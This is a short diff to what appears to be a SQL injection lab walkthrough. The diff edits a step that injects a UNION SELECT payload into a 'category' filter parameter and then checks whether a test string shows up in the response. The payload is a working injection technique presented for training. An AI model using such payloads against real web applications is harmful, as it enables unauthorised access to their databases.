@@ -104,7 +104,7 @@ ORDER BY 4--
 10. Inject the following payload:
 
 ```sql
-/filter?category=' UNION SELECT null,'3GCj9s',null--
+/filter?category=' UNION SELECT null,('3GCj9s'),null--
 ```
 
 11. Observe that the text appears in the application's response.
